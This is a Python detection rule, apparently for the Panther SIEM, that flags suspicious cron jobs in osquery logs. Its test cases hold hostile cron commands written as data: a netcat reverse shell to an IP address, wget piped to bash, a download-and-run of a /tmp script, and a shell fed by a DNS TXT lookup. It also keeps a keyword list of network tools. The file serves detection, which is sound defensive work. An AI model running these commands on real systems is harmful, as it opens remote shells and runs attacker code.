import shlex
from fnmatch import fnmatch
from typing import List

from pypanther.base import PantherRule, PantherRuleTest, PantherSeverity
from pypanther.helpers.panther_base_helpers import deep_get
from pypanther.log_types import LogType

osquery_suspicious_cron_tests: List[PantherRuleTest] = [
    PantherRuleTest(
        Name="Netcat Listener",
        ExpectedResult=True,
        Log={
            "name": "pack_incident-response_crontab",
            "hostIdentifier": "test-host",
            "action": "added",
            "columns": {
                "event": "",
                "minute": "17",
                "hour": "*",
                "day_of_month": "*",
                "month": "*",
                "day_of_week": "7",
                "command": "nc -e /bin/bash 237.233.242.58 80",
                "path": "/etc/crontab",
            },
        },
    ),
    PantherRuleTest(
        Name="Wget Pipe Bash",
        ExpectedResult=True,
        Log={
            "name": "pack_incident-response_crontab",
            "action": "added",
            "hostIdentifier": "test-host",
            "columns": {
                "event": "",
                "minute": "17",
                "hour": "*",
                "day_of_month": "*",
                "month": "*",
                "day_of_week": "7",
                "command": "wget -qO- -U- https://sd9fd8f9d8fe.io/i.sh|bash >/dev/null 2>&1",
                "path": "/etc/crontab",
            },
        },
    ),
    PantherRuleTest(
        Name="Wget Execute",
        ExpectedResult=True,
        Log={
            "name": "pack_incident-response_crontab",
            "action": "added",
            "hostIdentifier": "test-host",
            "columns": {
                "event": "",
                "minute": "17",
                "hour": "*",
                "day_of_month": "*",
                "month": "*",
                "day_of_week": "7",
                "command": "wget -O /tmp/load.sh http://test[.]io/load.sh; chmod 777 /tmp/load.sh; /tmp/load.sh >> /tmp/out.log",
                "path": "/etc/crontab",
            },
        },
    ),
    PantherRuleTest(
        Name="Dig",
        ExpectedResult=True,
        Log={
            "name": "pack_incident-response_crontab",
            "action": "added",
            "hostIdentifier": "test-host",
            "columns": {
                "event": "",
                "minute": "17",
                "hour": "*",
                "day_of_month": "*",
                "month": "*",
                "day_of_week": "7",
                "command": '/bin/sh -c "sh -c $(dig logging.chat TXT +short @pola.ns.cloudflare.com)"',
                "path": "/etc/crontab",
            },
        },
    ),
    PantherRuleTest(
        Name="Built-in Cron",
        ExpectedResult=False,
        Log={
            "name": "pack_incident-response_crontab",
            "action": "added",
            "hostIdentifier": "test-host",
            "columns": {
                "event": "",
                "minute": "17",
                "hour": "*",
                "day_of_month": "*",
                "month": "*",
                "day_of_week": "7",
                "command": "root cd / && run-parts --report /etc/cron.hourly",
                "path": "/etc/crontab",
            },
        },
    ),
    PantherRuleTest(
        Name="Command with quotes",
        ExpectedResult=False,
        Log={
            "name": "pack_incident-response_crontab",
            "action": "added",
            "hostIdentifier": "test-host",
            "columns": {
                "event": "",
                "minute": "17",
                "hour": "*",
                "day_of_month": "*",
                "month": "*",
                "day_of_week": "7",
                "command": "runit 'go fast'",
                "path": "/etc/crontab",
            },
        },
    ),
]


class OsquerySuspiciousCron(PantherRule):
    RuleID = "Osquery.SuspiciousCron-prototype"
    DisplayName = "Suspicious cron detected"
    LogTypes = [LogType.Osquery_Differential]
    Tags = ["Osquery", "Execution:Scheduled Task/Job"]
    Reports = {"MITRE ATT&CK": ["TA0002:T1053"]}
    Severity = PantherSeverity.High
    Description = "A suspicious cron has been added"
    Runbook = "Analyze the command to ensure no nefarious activity is occurring"
    Reference = "https://en.wikipedia.org/wiki/Cron"
    SummaryAttributes = ["action", "hostIdentifier", "name"]
    Tests = osquery_suspicious_cron_tests
    # Running in unexpected locations
    # nosec
    # Reaching out to the internet
    SUSPICIOUS_CRON_CMD_ARGS = {"/tmp/*", "curl", "dig", "http?://*", "nc", "wget"}
    # Passing arguments into /bin/sh
    SUSPICIOUS_CRON_CMDS = {"*|*sh", "*sh -c *"}

    def suspicious_cmd_pairs(self, command):
        return any((fnmatch(command, c) for c in self.SUSPICIOUS_CRON_CMDS))

    def suspicious_cmd_args(self, command):
        command_args = shlex.split(command.replace("'", "\\'"))  # escape single quotes
        for cmd in command_args:
            if any((fnmatch(cmd, c) for c in self.SUSPICIOUS_CRON_CMD_ARGS)):
                return True
        return False

    def rule(self, event):
        if "crontab" not in event.get("name"):
            return False
        command = deep_get(event, "columns", "command")
        if not command:
            return False
        return any([self.suspicious_cmd_args(command), self.suspicious_cmd_pairs(command)])

    def title(self, event):
        return f"Suspicious cron found on [{event.get('hostIdentifier', '<UNKNOWN_HOST>')}]"
